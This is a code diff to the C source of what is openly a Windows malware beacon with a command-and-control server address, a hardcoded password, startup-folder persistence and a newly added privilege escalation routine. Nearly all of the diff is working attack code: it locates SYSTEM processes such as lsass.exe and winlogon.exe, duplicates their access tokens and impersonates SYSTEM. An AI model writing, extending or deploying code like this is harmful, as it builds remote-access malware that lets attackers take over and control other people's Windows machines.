@@ -21,7 +21,7 @@ char* get_process_list();
 char* get_network_info();
 
 // Configuration
-#define C2_SERVER "192.168.253.25"  // Localhost for testing
+#define C2_SERVER "10.16.103.26"  // host for testing
 #define C2_PORT 8080
 #define PASSWORD "Mr.Robot"
 #define BEACON_INTERVAL 30000
@@ -977,6 +977,126 @@ int add_startup_folder_persistence(const char* beacon_path) {
         printf("[-] Failed to copy to startup folder: %ld\n", GetLastError());
         return 0;
     }
+}
+
+
+// ==================== PRIVILEGE ESCALATION ====================
+
+int escalate_privileges_token() {
+    HANDLE hToken = NULL;
+    HANDLE hProcess = NULL;
+    HANDLE hDupToken = NULL;
+    DWORD pid = 0;
+    
+    printf("[+] Attempting token impersonation privilege escalation\n");
+    
+    // Step 1: Find a SYSTEM process (like services.exe or winlogon.exe)
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) {
+        printf("[-] Failed to create process snapshot\n");
+        return 0;
+    }
+    
+    PROCESSENTRY32 pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+    
+    if (!Process32First(hSnapshot, &pe32)) {
+        CloseHandle(hSnapshot);
+        printf("[-] Failed to enumerate processes\n");
+        return 0;
+    }
+    
+    // Look for a suitable SYSTEM process
+    do {
+        // Common SYSTEM processes
+        if (_stricmp(pe32.szExeFile, "services.exe") == 0 ||
+            _stricmp(pe32.szExeFile, "winlogon.exe") == 0 ||
+            _stricmp(pe32.szExeFile, "lsass.exe") == 0 ||
+            _stricmp(pe32.szExeFile, "svchost.exe") == 0) {
+            
+            pid = pe32.th32ProcessID;
+            printf("[+] Found SYSTEM process: %s (PID: %d)\n", pe32.szExeFile, pid);
+            break;
+        }
+    } while (Process32Next(hSnapshot, &pe32));
+    
+    CloseHandle(hSnapshot);
+    
+    if (pid == 0) {
+        printf("[-] No suitable SYSTEM process found\n");
+        return 0;
+    }
+    
+    // Step 2: Open the process
+    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
+    if (!hProcess) {
+        printf("[-] Failed to open process %d: %ld\n", pid, GetLastError());
+        return 0;
+    }
+    
+    // Step 3: Get process token
+    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &hToken)) {
+        printf("[-] Failed to open process token: %ld\n", GetLastError());
+        CloseHandle(hProcess);
+        return 0;
+    }
+    
+    // Step 4: Duplicate the token
+    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDupToken)) {
+        printf("[-] Failed to duplicate token: %ld\n", GetLastError());
+        CloseHandle(hToken);
+        CloseHandle(hProcess);
+        return 0;
+    }
+    
+    // Step 5: Try to impersonate the token
+    if (!ImpersonateLoggedOnUser(hDupToken)) {
+        printf("[-] Failed to impersonate token: %ld\n", GetLastError());
+    } else {
+        printf("[+] Successfully impersonated SYSTEM token!\n");
+        
+        // Verify we have SYSTEM privileges
+        char username[256];
+        DWORD username_len = sizeof(username);
+        GetUserNameA(username, &username_len);
+        printf("[+] Current user: %s\n", username);
+        
+        // Check if we're SYSTEM
+        if (_stricmp(username, "SYSTEM") == 0) {
+            printf("[+] Privilege escalation successful! Running as SYSTEM.\n");
+        }
+        
+        RevertToSelf();  // Stop impersonation (optional)
+    }
+    
+    // Cleanup
+    if (hDupToken) CloseHandle(hDupToken);
+    if (hToken) CloseHandle(hToken);
+    if (hProcess) CloseHandle(hProcess);
+    
+    return 1;
+}
+
+// Alternative: Check current privileges
+void check_privileges() {
+    HANDLE hToken;
+    TOKEN_ELEVATION elevation;
+    DWORD dwSize;
+    
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
+        printf("[-] Failed to open process token\n");
+        return;
+    }
+    
+    if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
+        if (elevation.TokenIsElevated) {
+            printf("[+] Process has elevated privileges (Admin/UAC bypass)\n");
+        } else {
+            printf("[-] Process does NOT have elevated privileges\n");
+        }
+    }
+    
+    CloseHandle(hToken);
 }
 
 // ==================== BEACON MAIN ====================
